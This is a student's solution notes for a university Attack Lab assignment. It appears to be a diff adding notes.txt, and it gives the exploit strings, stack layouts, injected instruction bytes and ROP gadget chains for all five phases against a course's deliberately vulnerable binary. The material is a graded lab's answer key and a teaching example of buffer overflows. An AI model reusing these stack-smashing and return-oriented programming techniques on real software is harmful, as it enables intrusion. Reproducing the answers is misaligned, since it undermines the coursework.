@@ -1,0 +1,146 @@
+Jack Li
+May 9 2018
+CS 33 (1D)
+
+Attack Lab
+notes.txt
+
+Cookie: 0x75d6394e
+
+
+
+
+> Phase 1
+
+Exploit string:
+000000000000000000000000000000000000000000000000b617400000000000
+
+
+Stack frame of getbuf:
+0x5567ea28: 00000000 00000000
+0x5567ea30: 00000000 00000000
+0x5567ea38: 00000000 00000000
+0x5567ea40: b6174000 00000000  // address of touch1: 0x004017b6
+
+The last word was originally 28194000 (address of test: 0x00401928).
+
+> Phase 2
+
+Exploit string:
+48c7c74e39d675c30000000000000000000000000000000028ea675500000000e2174000
+
+
+Stack frame of getbuf:
+0x5567ea28: 48c7c74e 39d675c3
+0x5567ea30: 00000000 00000000
+0x5567ea38: 00000000 00000000
+0x5567ea40: 28ea6755 00000000  // address of injected instructions: 0x5567ea28
+
+Stack frame of test:
+0x5567ea48: e2174000 00000000  // address of touch2: 0x004017e2 (last piece of the puzzle)
+0x5567ea50: 361d4000 00000000
+0x5567ea58: 00000000 00000000
+0x5567ea60: f4f4f4f4 f4f4f4f4
+0x5567ea68: f4f4f4f4 f4f4f4f4
+0x5567ea70: f4f4f4f4 f4f4f4f4
+
+Injected instructions:
+   0:   48 c7 c7 4e 39 d6 75    mov    $0x75d6394e,%rdi
+   7:   c3                      retq
+
+Keep in mind that ret redirects control flow of the program and must return to a valid instruction address or else you will get a seg fault. Overwriting the initial return address with the address of the injected code is not enough, compiler must know what to do after that!
+
+
+> Phase 3
+
+Exploit string:
+0000000000000000488d7c2408c30000000000000000000030ea675500000000b6184000000000003735643633 393465
+
+Stack frame of getbuf:
+0x5567ea28: 00000000 00000000
+0x5567ea30: 488d7c24 08c30000
+0x5567ea38: 00000000 00000000
+0x5567ea40: 30ea6755 00000000  // address of injected instructions: 0x5567ea30
+
+Stack frame of test:
+0x5567ea48: b6184000 00000000  // address of touch3: 0x004018b6
+0x5567ea50: 37356436 33393465  // string representation of cookie
+0x5567ea58: 00000000 00000000
+0x5567ea60: f4f4f4f4 f4f4f4f4
+0x5567ea68: f4f4f4f4 f4f4f4f4
+0x5567ea70: f4f4f4f4 f4f4f4f4
+
+Injected instructions:
+   0:	48 8d 7c 24 08       	lea    0x8(%rsp),%rdi # get address of cookie
+   5:	c3                   	retq 
+
+The important thing to realize is that the string must be stored at a higher offset on the stack due to the lower portions in the getbuf frame being overwritten. It's ok to overwrite non-essential elements on the stack.
+
+
+
+> Phase 4
+
+Exploit string:
+0000000000000000000000000000000000000000000000004e194000000000004e39d675000000005619400000 000000e217400000000000
+
+Stack frame of getbuf:
+0x5567ea28: 00000000 00000000
+0x5567ea30: 00000000 00000000
+0x5567ea38: 00000000 00000000
+0x5567ea40: 4e194000 00000000  // address of gadget 1: 0x40194e
+
+Stack frame of test:
+0x5567ea48: 4e39d675 00000000  // cookie to be popped
+0x5567ea50: 56194000 00000000  // address of gadget 2: 0x401956
+0x5567ea58: e2174000 00000000  // address of touch2: 0x4017e2
+0x5567ea60: f4f4f4f4 f4f4f4f4
+0x5567ea68: f4f4f4f4 f4f4f4f4
+0x5567ea70: f4f4f4f4 f4f4f4f4
+
+Gadgets used:
+   40194e <addval_401+3>: 58 90 c3     pop %rax; ret          # pop cookie
+   401956 <addval_152+4>: 48 89 c7 c3  mov %rax,%rdi; ret     # pass cookie as 1st arg
+
+
+
+> Phase 5
+
+Exploit string:
+000000000000000000000000000000000000000000000000951940000000000055194000000000006419400000000004800000000000000a219400000000000a919400000000000491a40000000000081194000000000005519400000000000b61840000000000037356436333934650000000000000000
+
+Stack frame of getbuf:
+0x5567ea28: 00000000 00000000
+0x5567ea30: 00000000 00000000
+0x5567ea38: 00000000 00000000
+0x5567ea40: 95194000 00000000  // address of gadget 1: 0x401995
+
+Stack frame of test:
+0x5567ea48: 55194000 00000000  // address of gadget 2: 0x401955
+0x5567ea50: 64194000 00000000  // address of gadget 3: 0x401964
+0x5567ea58: 48000000 00000000  // address difference between stack frame top of test and string representation of cookie
+0x5567ea60: a2194000 00000000  // address of gadget 4: 0x4019a2
+0x5567ea68: a9194000 00000000  // address of gadget 5: 0x4019a9
+0x5567ea70: 491a4000 00000000  // address of gadget 6: 0x401a49
+0x5567ea78: 81194000 00000000  // address of gadget 7: 0x401981
+0x5567ea80: 55194000 00000000  // address of gadget 8: 0x401955
+0x5567ea88: b6184000 00000000  // address of touch3: 0x4018b6
+0x5567ea90: 37356436 33393465  // string representation of cookie
+0x5567ea98: 00000000 00000000  // null byte padding
+
+Gadgets used:
+   401995 <setval_369+2>: 48 89 e0 c3     mov %rsp,%rax; ret  # get stack pointer
+   401955 <addval_152+3>: 48 89 c7 c3     mov %rax,%rdi; ret  # store stack pointer as 1st argument
+   401964 <setval_380+4>: 58 90 c3        pop %rax; ret       # pop address difference
+   4019a2 <addval_193+2>: 89 c2 20 db c3  mov %eax,%edx; ret  # begin a bunch of inefficient but necessary data transfers...
+   4019a9 <addval_371+2>: 89 d1 38 db c3  mov %edx,%ecx; ret  
+   401a49 <addval_416+3>: 89 ce 90 c3     mov %ecx,%esi; ret  # store address difference as 2nd argument
+   401981 <add_xy>                                            # add address difference to stack frame top of test
+   401955 <addval_152+3>: 48 89 c7 c3     movq %rax,%rdi; ret # store result (address of cookie) as 1st argument
+
+The task's challenges were due to stack randomization, no code injections, and no
+memory access. Hence, you cannot hard code the address of the cookie string.
+Furthermore, the displacement of the cookie string must be computed. This can only
+be done via the add_xy function. You have to know that a gadget can be the starting
+address of an entire function, not just somewhere in the middle of the instruction byte
+sequences.
+
